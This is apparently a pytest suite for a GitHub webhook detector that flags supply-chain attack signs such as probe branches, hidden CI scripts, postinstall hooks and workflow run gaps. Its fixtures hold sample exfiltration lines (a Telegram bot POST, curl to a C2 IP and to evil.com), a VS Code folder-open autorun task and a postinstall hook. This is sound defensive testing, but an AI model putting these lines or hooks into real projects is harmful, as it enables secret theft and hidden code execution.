"""
Tests for WFX Phantom Detector.
"""
import json
import os

import pytest

os.environ.setdefault("ALLOW_IN_MEMORY", "true")

from app.detector import Finding, WFXDetector


@pytest.fixture
def detector():
    return WFXDetector("test-secret")


@pytest.fixture
def sample_pr_payload():
    return {
        "action": "opened",
        "pull_request": {
            "title": "docs: dependency audit notes",
            "head": {"ref": "wfx-docs"},
            "html_url": "https://github.com/test/repo/pull/1",
            "user": {"login": "attacker"},
        },
        "repository": {"full_name": "test/repo"},
    }


@pytest.fixture
def sample_push_payload():
    return {
        "ref": "refs/heads/main",
        "pusher": {"name": "attacker"},
        "commits": [
            {
                "message": "ci: refresh build cache\n\nAdded cache step",
                "url": "https://api.github.com/repos/test/repo/commits/abc123",
                "author": {"name": "Attacker", "email": "attacker@evil.com"},
                "added": [".ci-abc123.sh", ".github/workflows/build-audit-xyz789.yml"],
                "modified": ["package.json"],
            }
        ],
        "repository": {"full_name": "test/repo"},
    }


class TestDetector:
    """Test core detection logic."""

    def test_verify_signature_valid(self, detector):
        import hashlib
        import hmac
        payload = b'{"test": "data"}'
        sig = "sha256=" + hmac.new(b"test-secret", payload, hashlib.sha256).hexdigest()
        assert detector.verify_signature(payload, sig)

    def test_verify_signature_invalid(self, detector):
        payload = b'{"test": "data"}'
        assert not detector.verify_signature(payload, "sha256=invalid")

    def test_probe_pr_title(self, detector, sample_pr_payload):
        findings = detector._handle_pull_request(sample_pr_payload)
        assert any(f.finding_type == "PROBE_PR_TITLE" for f in findings)

    def test_probe_branch_wfx(self, detector, sample_pr_payload):
        findings = detector._handle_pull_request(sample_pr_payload)
        assert any(f.finding_type == "PROBE_BRANCH_WFX" for f in findings)

    def test_probe_branch_chore(self, detector):
        payload = {
            "action": "opened",
            "pull_request": {
                "title": "Normal PR",
                "head": {"ref": "chore/abcdefgh"},
                "html_url": "https://github.com/test/repo/pull/1",
                "user": {"login": "attacker"},
            },
            "repository": {"full_name": "test/repo"},
        }
        findings = detector._handle_pull_request(payload)
        assert any(f.finding_type == "PROBE_BRANCH_CHORE" for f in findings)

    def test_probe_branch_cicheck(self, detector):
        payload = {
            "action": "opened",
            "pull_request": {
                "title": "Normal PR",
                "head": {"ref": "ci-check-1234"},
                "html_url": "https://github.com/test/repo/pull/1",
                "user": {"login": "attacker"},
            },
            "repository": {"full_name": "test/repo"},
        }
        findings = detector._handle_pull_request(payload)
        assert any(f.finding_type == "PROBE_BRANCH_CICHECK" for f in findings)

    def test_probe_commit_messages(self, detector, sample_push_payload):
        findings = detector._handle_push(sample_push_payload)
        assert any(f.finding_type == "PROBE_COMMIT_MSG" for f in findings)

    def test_payload_ci_sh(self, detector, sample_push_payload):
        findings = detector._handle_push(sample_push_payload)
        assert any(f.finding_type == "PAYLOAD_CI_SH" for f in findings)

    def test_payload_build_audit(self, detector, sample_push_payload):
        findings = detector._handle_push(sample_push_payload)
        assert any(f.finding_type == "PAYLOAD_BUILD_AUDIT" for f in findings)

    def test_suspicious_package_json(self, detector, sample_push_payload):
        findings = detector._handle_push(sample_push_payload)
        assert any(f.finding_type == "SUSPICIOUS_PACKAGE_JSON" for f in findings)

    def test_compromised_actor(self, detector):
        payload = {
            "action": "opened",
            "pull_request": {
                "title": "Normal PR",
                "head": {"ref": "feature/test"},
                "html_url": "https://github.com/test/repo/pull/1",
                "user": {"login": "wdio-bot"},
            },
            "repository": {"full_name": "test/repo"},
        }
        findings = detector._handle_pull_request(payload)
        assert any(f.finding_type == "COMPROMISED_ACTOR" for f in findings)

    def test_workflow_run_gap_detection(self, detector):
        # Simulate runs 1, 2, 4 (gap at 3)
        payload1 = {
            "action": "completed",
            "workflow_run": {"workflow_id": 123, "run_number": 1, "name": "CI", "actor": {"login": "user"}},
            "repository": {"full_name": "test/repo"},
        }
        payload2 = {
            "action": "completed",
            "workflow_run": {"workflow_id": 123, "run_number": 2, "name": "CI", "actor": {"login": "user"}},
            "repository": {"full_name": "test/repo"},
        }
        payload3 = {
            "action": "completed",
            "workflow_run": {"workflow_id": 123, "run_number": 4, "name": "CI", "actor": {"login": "user"}},
            "repository": {"full_name": "test/repo"},
        }
        # A confirming higher run is required before a gap is reported (defect 7).
        payload4 = {
            "action": "completed",
            "workflow_run": {"workflow_id": 123, "run_number": 6, "name": "CI", "actor": {"login": "user"}},
            "repository": {"full_name": "test/repo"},
        }

        detector._handle_workflow_run(payload1)
        detector._handle_workflow_run(payload2)
        detector._handle_workflow_run(payload3)
        # Gap at #3 is reported only after a confirming higher run (#6) arrives (defect 7).
        findings = detector._handle_workflow_run(payload4)

        assert any(f.finding_type == "WORKFLOW_RUN_GAP" for f in findings)
        gap_finding = next(f for f in findings if f.finding_type == "WORKFLOW_RUN_GAP")
        assert "1 missing run number" in gap_finding.detail

    def test_branch_created_wfx(self, detector):
        payload = {
            "ref_type": "branch",
            "ref": "wfx-docs",
            "repository": {"full_name": "test/repo"},
            "sender": {"login": "attacker"},
        }
        findings = detector._handle_create(payload)
        assert any(f.finding_type == "BRANCH_CREATED_WFX" for f in findings)

    def test_branch_deleted_cleanup(self, detector):
        payload = {
            "ref_type": "branch",
            "ref": "chore/abcdefgh",
            "repository": {"full_name": "test/repo"},
            "sender": {"login": "attacker"},
        }
        findings = detector._handle_delete(payload)
        assert any(f.finding_type == "BRANCH_DELETED_CLEANUP" for f in findings)

    def test_content_ioc_scan(self, detector):
        content = """
        # Malicious script
        WF_CTOKEN="secret"
        curl -X POST https://api.telegram.org/bot123:abc/sendMessage
        EXFIL_DATA=$(cat /tmp/secrets)
        """
        findings = detector.scan_file_content("test/repo", ".ci-evil.sh", content, "main")
        assert any(f.finding_type == "CONTENT_IOC_MATCH" for f in findings)
        ioc_finding = next(f for f in findings if f.finding_type == "CONTENT_IOC_MATCH")
        assert "WF_CTOKEN" in ioc_finding.detail or "telegram" in ioc_finding.detail.lower()

    def test_content_ioc_c2_ips(self, detector):
        content = "curl http://194.150.166.244:8080/exfil"
        findings = detector.scan_file_content("test/repo", "script.sh", content, "main")
        assert any(f.finding_type == "CONTENT_IOC_MATCH" for f in findings)

    def test_postinstall_detection(self, detector):
        content = json.dumps({
            "scripts": {
                "postinstall": "./.ci-abc123.sh"
            }
        })
        findings = detector.scan_file_content("test/repo", "package.json", content, "main")
        assert any(f.finding_type == "POSTINSTALL_CI_SH" for f in findings)

    def test_malicious_package_detection(self, detector):
        content = '{"dependencies": {"digitalelvis/neuronai-studio": "3.14.3"}}'
        findings = detector.check_package_manifest("test/repo", "composer.json", content)
        assert any(f.finding_type == "MALICIOUS_PACKAGE_VERSION" for f in findings)

    def test_oversized_workflow(self, detector):
        content = "x\n" * 1500  # >1000 lines
        findings = detector.scan_file_content("test/repo", ".github/workflows/ci.yml", content, "main")
        assert any(f.finding_type == "OVERSIZED_WORKFLOW" for f in findings)

    def test_vscode_autorun(self, detector):
        content = json.dumps({
            "version": "2.0.0",
            "tasks": [{
                "label": "malicious",
                "runOn": "folderOpen",
                "command": "curl evil.com"
            }]
        })
        findings = detector.scan_file_content("test/repo", ".vscode/tasks.json", content, "main")
        assert any(f.finding_type == "VSCODE_AUTORUN_TASK" for f in findings)


class TestFinding:
    """Test Finding dataclass."""

    def test_to_dict(self):
        f = Finding(
            finding_type="TEST",
            severity="HIGH",
            detail="Test detail",
            url="https://github.com/test/repo",
            repository="test/repo",
            actor="testuser",
        )
        d = f.to_dict()
        assert d["type"] == "TEST"
        assert d["severity"] == "HIGH"
        assert d["repository"] == "test/repo"
        assert "timestamp" in d


class TestIntegration:
    """Integration tests for full event processing."""

    def test_process_pull_request_event(self, detector, sample_pr_payload):
        findings = detector.process_event("pull_request", sample_pr_payload)
        assert len(findings) >= 2  # PR title + branch
        types = {f.finding_type for f in findings}
        assert "PROBE_PR_TITLE" in types
        assert "PROBE_BRANCH_WFX" in types

    def test_process_push_event(self, detector, sample_push_payload):
        findings = detector.process_event("push", sample_push_payload)
        types = {f.finding_type for f in findings}
        assert "PROBE_COMMIT_MSG" in types
        assert "PAYLOAD_CI_SH" in types
        assert "PAYLOAD_BUILD_AUDIT" in types
        assert "SUSPICIOUS_PACKAGE_JSON" in types

    def test_unknown_event_type(self, detector):
        findings = detector.process_event("unknown_event", {})
        assert len(findings) == 0

    def test_malformed_payload(self, detector):
        findings = detector.process_event("pull_request", {"invalid": "payload"})
        # Should not crash, may produce PROCESSING_ERROR
        assert all(f.finding_type in ("PROCESSING_ERROR",) for f in findings if f.severity == "LOW")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
